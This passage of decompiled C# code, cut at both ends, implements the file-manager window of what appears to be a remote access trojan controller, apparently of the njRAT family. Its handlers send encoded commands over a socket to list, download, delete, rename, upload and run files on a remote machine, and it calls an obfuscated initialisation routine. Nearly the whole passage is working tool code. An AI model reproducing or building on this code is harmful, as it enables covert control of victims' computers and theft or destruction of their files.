		// (set) Token: 0x06000407 RID: 1031 RVA: 0x00003557 File Offset: 0x00001757
		internal virtual ToolStripSeparator ToolStripSeparator3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator3 = value;
			}
		}

		// Token: 0x17000198 RID: 408
		// (get) Token: 0x06000408 RID: 1032 RVA: 0x000260A8 File Offset: 0x000242A8
		// (set) Token: 0x06000409 RID: 1033 RVA: 0x00003560 File Offset: 0x00001760
		internal virtual ToolStripSeparator ToolStripSeparator4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator4 = value;
			}
		}

		// Token: 0x17000199 RID: 409
		// (get) Token: 0x0600040A RID: 1034 RVA: 0x000260C0 File Offset: 0x000242C0
		// (set) Token: 0x0600040B RID: 1035 RVA: 0x00003569 File Offset: 0x00001769
		internal virtual ToolStripSeparator ToolStripSeparator5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator5 = value;
			}
		}

		// Token: 0x1700019A RID: 410
		// (get) Token: 0x0600040C RID: 1036 RVA: 0x000260D8 File Offset: 0x000242D8
		// (set) Token: 0x0600040D RID: 1037 RVA: 0x000260F0 File Offset: 0x000242F0
		internal virtual ToolStripMenuItem OpenFolderToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._OpenFolderToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.OpenFolderToolStripMenuItem_Click);
				if (this._OpenFolderToolStripMenuItem != null)
				{
					this._OpenFolderToolStripMenuItem.Click -= value2;
				}
				this._OpenFolderToolStripMenuItem = value;
				if (this._OpenFolderToolStripMenuItem != null)
				{
					this._OpenFolderToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700019B RID: 411
		// (get) Token: 0x0600040E RID: 1038 RVA: 0x00026148 File Offset: 0x00024348
		// (set) Token: 0x0600040F RID: 1039 RVA: 0x00003572 File Offset: 0x00001772
		internal virtual ContextMenuStrip ContextMenuStrip3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ContextMenuStrip3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ContextMenuStrip3 = value;
			}
		}

		// Token: 0x1700019C RID: 412
		// (get) Token: 0x06000410 RID: 1040 RVA: 0x00026160 File Offset: 0x00024360
		// (set) Token: 0x06000411 RID: 1041 RVA: 0x00026178 File Offset: 0x00024378
		internal virtual ToolStripMenuItem SaveToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SaveToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveToolStripMenuItem_Click);
				if (this._SaveToolStripMenuItem != null)
				{
					this._SaveToolStripMenuItem.Click -= value2;
				}
				this._SaveToolStripMenuItem = value;
				if (this._SaveToolStripMenuItem != null)
				{
					this._SaveToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700019D RID: 413
		// (get) Token: 0x06000412 RID: 1042 RVA: 0x000261D0 File Offset: 0x000243D0
		// (set) Token: 0x06000413 RID: 1043 RVA: 0x0000357B File Offset: 0x0000177B
		internal virtual ToolStripSeparator AToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._AToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._AToolStripMenuItem = value;
			}
		}

		// Token: 0x1700019E RID: 414
		// (get) Token: 0x06000414 RID: 1044 RVA: 0x000261E8 File Offset: 0x000243E8
		// (set) Token: 0x06000415 RID: 1045 RVA: 0x00026200 File Offset: 0x00024400
		internal virtual ToolStripMenuItem SellectAllToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SellectAllToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SellectAllToolStripMenuItem_Click);
				if (this._SellectAllToolStripMenuItem != null)
				{
					this._SellectAllToolStripMenuItem.Click -= value2;
				}
				this._SellectAllToolStripMenuItem = value;
				if (this._SellectAllToolStripMenuItem != null)
				{
					this._SellectAllToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700019F RID: 415
		// (get) Token: 0x06000416 RID: 1046 RVA: 0x00026258 File Offset: 0x00024458
		// (set) Token: 0x06000417 RID: 1047 RVA: 0x00003584 File Offset: 0x00001784
		internal virtual ToolStripSeparator ToolStripSeparator7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator7 = value;
			}
		}

		// Token: 0x170001A0 RID: 416
		// (get) Token: 0x06000418 RID: 1048 RVA: 0x00026270 File Offset: 0x00024470
		// (set) Token: 0x06000419 RID: 1049 RVA: 0x00026288 File Offset: 0x00024488
		internal virtual ToolStripMenuItem CutToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CutToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CutToolStripMenuItem1_Click);
				if (this._CutToolStripMenuItem1 != null)
				{
					this._CutToolStripMenuItem1.Click -= value2;
				}
				this._CutToolStripMenuItem1 = value;
				if (this._CutToolStripMenuItem1 != null)
				{
					this._CutToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170001A1 RID: 417
		// (get) Token: 0x0600041A RID: 1050 RVA: 0x000262E0 File Offset: 0x000244E0
		// (set) Token: 0x0600041B RID: 1051 RVA: 0x000262F8 File Offset: 0x000244F8
		internal virtual ToolStripMenuItem CopyToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyToolStripMenuItem1_Click);
				if (this._CopyToolStripMenuItem1 != null)
				{
					this._CopyToolStripMenuItem1.Click -= value2;
				}
				this._CopyToolStripMenuItem1 = value;
				if (this._CopyToolStripMenuItem1 != null)
				{
					this._CopyToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170001A2 RID: 418
		// (get) Token: 0x0600041C RID: 1052 RVA: 0x00026350 File Offset: 0x00024550
		// (set) Token: 0x0600041D RID: 1053 RVA: 0x00026368 File Offset: 0x00024568
		internal virtual ToolStripMenuItem PasteToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PasteToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PasteToolStripMenuItem_Click);
				if (this._PasteToolStripMenuItem != null)
				{
					this._PasteToolStripMenuItem.Click -= value2;
				}
				this._PasteToolStripMenuItem = value;
				if (this._PasteToolStripMenuItem != null)
				{
					this._PasteToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170001A3 RID: 419
		// (get) Token: 0x0600041E RID: 1054 RVA: 0x000263C0 File Offset: 0x000245C0
		// (set) Token: 0x0600041F RID: 1055 RVA: 0x0000358D File Offset: 0x0000178D
		internal virtual ToolStrip ToolStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStrip1 = value;
			}
		}

		// Token: 0x170001A4 RID: 420
		// (get) Token: 0x06000420 RID: 1056 RVA: 0x000263D8 File Offset: 0x000245D8
		// (set) Token: 0x06000421 RID: 1057 RVA: 0x000263F0 File Offset: 0x000245F0
		internal virtual ToolStripButton ToolStripButton2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripButton2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripButton2_Click);
				if (this._ToolStripButton2 != null)
				{
					this._ToolStripButton2.Click -= value2;
				}
				this._ToolStripButton2 = value;
				if (this._ToolStripButton2 != null)
				{
					this._ToolStripButton2.Click += value2;
				}
			}
		}

		// Token: 0x170001A5 RID: 421
		// (get) Token: 0x06000422 RID: 1058 RVA: 0x00026448 File Offset: 0x00024648
		// (set) Token: 0x06000423 RID: 1059 RVA: 0x00026460 File Offset: 0x00024660
		internal virtual ToolStripButton ToolStripButton3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripButton3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripButton3_Click);
				if (this._ToolStripButton3 != null)
				{
					this._ToolStripButton3.Click -= value2;
				}
				this._ToolStripButton3 = value;
				if (this._ToolStripButton3 != null)
				{
					this._ToolStripButton3.Click += value2;
				}
			}
		}

		// Token: 0x170001A6 RID: 422
		// (get) Token: 0x06000424 RID: 1060 RVA: 0x000264B8 File Offset: 0x000246B8
		// (set) Token: 0x06000425 RID: 1061 RVA: 0x000264D0 File Offset: 0x000246D0
		internal virtual ToolStripButton ToolStripButton4
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripButton4;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripButton4_Click);
				if (this._ToolStripButton4 != null)
				{
					this._ToolStripButton4.Click -= value2;
				}
				this._ToolStripButton4 = value;
				if (this._ToolStripButton4 != null)
				{
					this._ToolStripButton4.Click += value2;
				}
			}
		}

		// Token: 0x170001A7 RID: 423
		// (get) Token: 0x06000426 RID: 1062 RVA: 0x00026528 File Offset: 0x00024728
		// (set) Token: 0x06000427 RID: 1063 RVA: 0x00003596 File Offset: 0x00001796
		internal virtual ToolStripSeparator ToolStripSeparator6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator6 = value;
			}
		}

		// Token: 0x170001A8 RID: 424
		// (get) Token: 0x06000428 RID: 1064 RVA: 0x00026540 File Offset: 0x00024740
		// (set) Token: 0x06000429 RID: 1065 RVA: 0x00026558 File Offset: 0x00024758
		internal virtual ToolStripButton ToolStripButton1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripButton1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripButton1_Click_1);
				if (this._ToolStripButton1 != null)
				{
					this._ToolStripButton1.Click -= value2;
				}
				this._ToolStripButton1 = value;
				if (this._ToolStripButton1 != null)
				{
					this._ToolStripButton1.Click += value2;
				}
			}
		}

		// Token: 0x170001A9 RID: 425
		// (get) Token: 0x0600042A RID: 1066 RVA: 0x000265B0 File Offset: 0x000247B0
		// (set) Token: 0x0600042B RID: 1067 RVA: 0x000265C8 File Offset: 0x000247C8
		internal virtual LV L1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._L1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.L1_DoubleClick);
				if (this._L1 != null)
				{
					this._L1.DoubleClick -= value2;
				}
				this._L1 = value;
				if (this._L1 != null)
				{
					this._L1.DoubleClick += value2;
				}
			}
		}

		// Token: 0x170001AA RID: 426
		// (get) Token: 0x0600042C RID: 1068 RVA: 0x00026620 File Offset: 0x00024820
		// (set) Token: 0x0600042D RID: 1069 RVA: 0x0000359F File Offset: 0x0000179F
		internal virtual ColumnHeader ColumnHeader6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader6 = value;
			}
		}

		// Token: 0x170001AB RID: 427
		// (get) Token: 0x0600042E RID: 1070 RVA: 0x00026638 File Offset: 0x00024838
		// (set) Token: 0x0600042F RID: 1071 RVA: 0x000035A8 File Offset: 0x000017A8
		internal virtual ColumnHeader ColumnHeader8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader8 = value;
			}
		}

		// Token: 0x170001AC RID: 428
		// (get) Token: 0x06000430 RID: 1072 RVA: 0x00026650 File Offset: 0x00024850
		// (set) Token: 0x06000431 RID: 1073 RVA: 0x000035B1 File Offset: 0x000017B1
		internal virtual ImageList MG
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MG;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MG = value;
			}
		}

		// Token: 0x170001AD RID: 429
		// (get) Token: 0x06000432 RID: 1074 RVA: 0x00026668 File Offset: 0x00024868
		// (set) Token: 0x06000433 RID: 1075 RVA: 0x000035BA File Offset: 0x000017BA
		internal virtual ImageList MG2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MG2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._MG2 = value;
			}
		}

		// Token: 0x06000434 RID: 1076 RVA: 0x00026680 File Offset: 0x00024880
		public FrmFilemanager()
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			base.Load += new EventHandler(this.FM_Load);
			base.Resize += new EventHandler(this.FM_Resize);
			base.FormClosing += new FormClosingEventHandler(this.FM_FormClosing);
			FrmFilemanager.__ENCAddToList(this);
			this.isCut = false;
			this.Flist = "";
			this.Images = new Collection();
			this.QQ = "";
			this.Cache = new Collection();
			PictureBox pictureBox = new PictureBox();
			Size size = new Size(160, 120);
			pictureBox.Size = size;
			pictureBox.BackColor = Color.Black;
			pictureBox.SizeMode = PictureBoxSizeMode.Zoom;
			pictureBox.Anchor = AnchorStyles.Left;
			pictureBox.Anchor = AnchorStyles.Bottom;
			this.P = pictureBox;
			this.InitializeComponent();
		}

		// Token: 0x06000435 RID: 1077 RVA: 0x00026754 File Offset: 0x00024954
		private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.L2.SelectedItems.Count > 0)
			{
				string text = "dl";
				try
				{
					IEnumerator enumerator = this.L2.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						if (Operators.CompareString(listViewItem.Text, "..", false) != 0)
						{
							if (Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) == 0)
							{
								string arg_98_0 = text;
								string arg_98_1 = ima.Y;
								string text2 = listViewItem.ToolTipText + ";*";
								text = arg_98_0 + arg_98_1 + Fungsi.ENB(ref text2);
							}
							else
							{
								string arg_BE_0 = text;
								string arg_BE_1 = ima.Y;
								string text2 = listViewItem.ToolTipText + ";";
								text = arg_BE_0 + arg_BE_1 + Fungsi.ENB(ref text2);
							}
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x06000436 RID: 1078 RVA: 0x00026868 File Offset: 0x00024A68
		private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				IEnumerator enumerator = this.L2.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					if (Operators.CompareString(listViewItem.Text, "..", false) != 0 && Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0)
					{
						Client client = this.sk;
						string str = "dw";
						string y = ima.Y;
						ListViewItem listViewItem2 = listViewItem;
						string toolTipText = listViewItem2.ToolTipText;
						string str2 = Fungsi.ENB(ref toolTipText);
						listViewItem2.ToolTipText = toolTipText;
						client.Send(str + y + str2);
					}
				}
			}
			finally
			{
				IEnumerator enumerator2;
				if (enumerator2 is IDisposable)
				{
					(enumerator2 as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x06000437 RID: 1079 RVA: 0x00026950 File Offset: 0x00024B50
		private void EditToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.L2.SelectedItems.Count > 0)
			{
				string text = "rd";
				try
				{
					IEnumerator enumerator = this.L2.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						if (Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0)
						{
							ListViewItem listViewItem2 = listViewItem;
							string toolTipText = listViewItem2.ToolTipText;
							listViewItem2.ToolTipText = toolTipText;
							text = text + ima.Y + Fungsi.ENB(ref toolTipText);
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x06000438 RID: 1080 RVA: 0x00026A24 File Offset: 0x00024C24
		public void exp(string x, bool Refresh = false)
		{
			checked
			{
				try
				{
					CHProgressbar pr = this.pr;
					CHProgressbar obj = pr;
					lock (obj)
					{
						this.P.Image = null;
						this.P.Visible = false;
						string text = x.Replace("\\\\", "\\");
						if (!text.EndsWith("\\"))
						{
							text += "\\";
						}
						this.TextBox1.Text = text;
						if (Refresh && this.Cache.Contains(text))
						{
							this.Cache.Remove(text);
						}
						if (this.Cache.Contains(text))
						{
							FMcach fMcach = (FMcach)this.Cache[text];
							this.pr.Value = 0;
							this.pr.Maximum = fMcach.files.Count + fMcach.folders.Count;
							this.L2.Items.Clear();
							if (new DirectoryInfo(text).Parent != null)
							{
								ListViewItem listViewItem = this.L2.Items.Add("..", "..", 0);
								listViewItem.SubItems.Add("");
								listViewItem.SubItems.Add("DIR");
								listViewItem.ToolTipText = new DirectoryInfo(text).Parent.FullName + "\\";
							}
							try
							{
								List<string>.Enumerator enumerator = fMcach.folders.GetEnumerator();
								while (enumerator.MoveNext())
								{
									string current = enumerator.Current;
									CHProgressbar pr2 = this.pr;
									CHProgressbar cHProgressbar = pr2;
									cHProgressbar.Value++;
									ListViewItem listViewItem2 = this.L2.Items.Add(current, new DirectoryInfo(current).Name, 0);
									listViewItem2.SubItems.Add("");
									listViewItem2.SubItems.Add("DIR");
									listViewItem2.ToolTipText = current;
								}
							}
							finally
							{
								List<string>.Enumerator enumerator;
								((IDisposable)enumerator).Dispose();
							}
							try
							{
								List<string>.Enumerator enumerator2 = fMcach.files.GetEnumerator();
								while (enumerator2.MoveNext())
								{
									string current2 = enumerator2.Current;
									CHProgressbar pr2 = this.pr;
									CHProgressbar cHProgressbar = pr2;
									cHProgressbar.Value++;
									string[] array = Strings.Split(current2, ";", -1, CompareMethod.Binary);
									FileInfo fileInfo = new FileInfo(array[0]);
									ListViewItem listViewItem3 = this.L2.Items.Add(fileInfo.FullName, fileInfo.Name, 1);
									listViewItem3.ToolTipText = fileInfo.FullName;
									listViewItem3.SubItems.Add(array[1]);
									listViewItem3.SubItems.Add(array[2]);
									if (fileInfo.Extension.Length > 0)
									{
										if (!this.MG2.Images.ContainsKey(fileInfo.Extension))
										{
											File.Create(Application.StartupPath + "\\!" + fileInfo.Extension).Close();
											this.MG2.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\\!" + fileInfo.Extension));
											File.Delete(Application.StartupPath + "\\!" + fileInfo.Extension);
											listViewItem3.ImageKey = fileInfo.Extension;
										}
										else
										{
											listViewItem3.ImageKey = fileInfo.Extension;
										}
									}
								}
							}
							finally
							{
								List<string>.Enumerator enumerator2;
								((IDisposable)enumerator2).Dispose();
							}
							this.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
							this.pr.Value = 0;
						}
						else
						{
							this.sk.Send("!" + ima.Y + Fungsi.ENB(ref text));
						}
					}
				}
				catch (Exception expr_3C1)
				{
					ProjectData.SetProjectError(expr_3C1);
					ProjectData.ClearProjectError();
				}
			}
		}

		// Token: 0x06000439 RID: 1081 RVA: 0x00026E64 File Offset: 0x00025064
		private void FM_FormClosing(object sender, FormClosingEventArgs e)
		{
			Fungsi.STV("FM1", Conversions.ToString(this.ToolStripButton4.Checked));
			Fungsi.STV("FM2", Conversions.ToString(this.ToolStripButton2.Checked));
			Fungsi.STV("FM3", Conversions.ToString(this.ToolStripButton3.Checked));
			Fungsi.STV("FM4", Conversions.ToString(this.ToolStripButton1.Checked));
			try
			{
				this.P.Dispose();
			}
			catch (Exception expr_75)
			{
				ProjectData.SetProjectError(expr_75);
				Exception projectError = expr_75;
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				this.Images.Clear();
			}
			catch (Exception expr_9C)
			{
				ProjectData.SetProjectError(expr_9C);
				Exception projectError2 = expr_9C;
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			try
			{
				this.Cache.Clear();
			}
			catch (Exception expr_C3)
			{
				ProjectData.SetProjectError(expr_C3);
				Exception projectError3 = expr_C3;
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
				ProjectData.ClearProjectError();
			}
			this.sk.CN = false;
		}

		// Token: 0x0600043A RID: 1082 RVA: 0x00026F84 File Offset: 0x00025184
		private void FM_Load(object sender, EventArgs e)
		{
			this.ToolStripButton4.Checked = Conversions.ToBoolean(Fungsi.GTV("FM1", Conversions.ToString(this.ToolStripButton4.Checked)));
			this.ToolStripButton2.Checked = Conversions.ToBoolean(Fungsi.GTV("FM2", Conversions.ToString(this.ToolStripButton2.Checked)));
			this.ToolStripButton3.Checked = Conversions.ToBoolean(Fungsi.GTV("FM3", Conversions.ToString(this.ToolStripButton3.Checked)));
			this.ToolStripButton1.Checked = Conversions.ToBoolean(Fungsi.GTV("FM4", Conversions.ToString(this.ToolStripButton1.Checked)));
			if (this.ToolStripButton4.Checked)
			{
				this.ToolStripButton4.PerformClick();
			}
			else if (this.ToolStripButton2.Checked)
			{
				this.ToolStripButton2.PerformClick();
			}
			else if (this.ToolStripButton3.Checked)
			{
				this.ToolStripButton3.PerformClick();
			}
			if (this.ToolStripButton1.Checked)
			{
				this.SplitContainer2.Panel2Collapsed = true;
				this.ToolStripButton1.Checked = false;
				this.ToolStripButton1.Image = Resources.application_sidebar_collapse;
			}
			else
			{
				this.ToolStripButton1.Checked = true;
				this.SplitContainer2.Panel2Collapsed = false;
				this.ToolStripButton1.Image = Resources.application_sidebar_expand;
			}
			this.L2.FX();
			this.L1.FX();
			this.L2.Controls.Add(this.P);
			this.P.BringToFront();
			this.P.Visible = false;
			this.P.BorderStyle = BorderStyle.FixedSingle;
			this.QQ = Conversions.ToString(RuntimeHelpers.GetObjectValue(ima.vno(this.osk.L)));
			this.Text = "File Manager - " + this.QQ;
			this.sk.Send("~");
		}

		// Token: 0x0600043B RID: 1083 RVA: 0x0002717C File Offset: 0x0002537C
		private void FM_Resize(object sender, EventArgs e)
		{
			checked
			{
				this.P.Left = this.L2.Width - this.P.Width - 25;
				this.P.Top = this.L2.Height - this.P.Height - 25;
			}
		}

		// Token: 0x0600043C RID: 1084 RVA: 0x000035C3 File Offset: 0x000017C3
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.sk.Send("~");
		}

		// Token: 0x0600043D RID: 1085 RVA: 0x000271D4 File Offset: 0x000253D4
		private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				IEnumerator enumerator = this.L2.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
					if (Operators.CompareString(listViewItem.Text, "..", false) != 0)
					{
						if (Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) == 0)
						{
							string text = Interaction.InputBox("", "Rename", listViewItem.Text, -1, -1);
							if (text.Length > 0)
							{
								Client arg_B9_0 = this.sk;
								string arg_B4_0 = "nm";
								string arg_B4_1 = ima.Y;
								string text2 = listViewItem.ToolTipText + ";" + text + ";*";
								arg_B9_0.Send(arg_B4_0 + arg_B4_1 + Fungsi.ENB(ref text2));
							}
						}
						else
						{
							string text3 = Interaction.InputBox("", "Rename", listViewItem.Text, -1, -1);
							if (text3.Length > 0)
							{
								Client arg_11A_0 = this.sk;
								string arg_115_0 = "nm";
								string arg_115_1 = ima.Y;
								string text2 = listViewItem.ToolTipText + ";" + text3 + ";";
								arg_11A_0.Send(arg_115_0 + arg_115_1 + Fungsi.ENB(ref text2));
							}
						}
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600043E RID: 1086 RVA: 0x00027344 File Offset: 0x00025544
		private void Timer1_Tick(object sender, EventArgs e)
		{
			if (this.osk == null | this.sk == null)
			{
				this.Timer1.Enabled = false;
				try
				{
					IEnumerator enumerator = this.Controls.GetEnumerator();
					while (enumerator.MoveNext())
					{
						Control control = (Control)enumerator.Current;
						control.Enabled = false;
					}
					return;
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			if (!this.osk.CN | !this.sk.CN)
			{
				this.Timer1.Enabled = false;
				try
				{
					IEnumerator enumerator2 = this.Controls.GetEnumerator();
					while (enumerator2.MoveNext())
					{
						Control control2 = (Control)enumerator2.Current;
						control2.Enabled = false;
					}
				}
				finally
				{
					IEnumerator enumerator2;
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
			}
		}

		// Token: 0x0600043F RID: 1087 RVA: 0x00027440 File Offset: 0x00025640
		private void UploadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.L2.Items.Count != 0)
			{
				string text = this.TextBox1.Text;
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.FileName = "";
				bool arg_5D_0;
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					if (FileSystem.FileLen(openFileDialog.FileName) != 0L)
					{
						arg_5D_0 = true;
						goto IL_5D;
					}
				}
				arg_5D_0 = false;
				IL_5D:
				if (arg_5D_0)
				{
					FrmUpload frmUpload = new FrmUpload();
					frmUpload.TMP = openFileDialog.FileName;
					frmUpload.FN = (text + "\\" + new FileInfo(openFileDialog.FileName).Name).Replace("\\\\", "\\");
					frmUpload.Name = this.sk.ip() + Fungsi.ENB(ref frmUpload.FN);
					frmUpload.c = this.sk;
					frmUpload.SZ = checked((int)FileSystem.FileLen(frmUpload.TMP));
					frmUpload.Text = new FileInfo(frmUpload.TMP).Name + " >> " + frmUpload.FN;
					frmUpload.Show();
				}
			}
		}

		// Token: 0x06000440 RID: 1088 RVA: 0x000035D6 File Offset: 0x000017D6
		private void UPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.L2.Items.ContainsKey(".."))
			{
				this.exp(this.L2.Items[".."].ToolTipText, false);
			}
		}

		// Token: 0x06000441 RID: 1089 RVA: 0x00003610 File Offset: 0x00001810
		private void RefreshToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			if (this.TextBox1.Text.Length > 0)
			{
				this.exp(this.TextBox1.Text, true);
			}
		}

		// Token: 0x06000442 RID: 1090 RVA: 0x00002F54 File Offset: 0x00001154
		private void TextBox1_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000443 RID: 1091 RVA: 0x0002755C File Offset: 0x0002575C
		private void RunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.L2.SelectedItems.Count > 0)
			{
				string text = "rn";
				try
				{
					IEnumerator enumerator = this.L2.SelectedItems.GetEnumerator();
					while (enumerator.MoveNext())
					{
						ListViewItem listViewItem = (ListViewItem)enumerator.Current;
						string toolTipText = listViewItem.ToolTipText;
						listViewItem.ToolTipText = toolTipText;
						text = text + ima.Y + Fungsi.ENB(ref toolTipText);
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x06000444 RID: 1092 RVA: 0x000035D6 File Offset: 0x000017D6
		private void PictureBox1_Click(object sender, EventArgs e)
		{
			if (this.L2.Items.ContainsKey(".."))
			{
				this.exp(this.L2.Items[".."].ToolTipText, false);
			}
		}

		// Token: 0x06000445 RID: 1093 RVA: 0x00003610 File Offset: 0x00001810
		private void PictureBox2_Click(object sender, EventArgs e)
		{
			if (this.TextBox1.Text.Length > 0)
			{
				this.exp(this.TextBox1.Text, true);
			}
		}

		// Token: 0x06000446 RID: 1094 RVA: 0x00027604 File Offset: 0x00025804
		private void CutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			IEnumerator enumerator = null;
			string text = "";
			try
			{
				enumerator = this.L2.SelectedItems.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ListViewItem listViewItem = (ListViewItem)enumerator.Current;
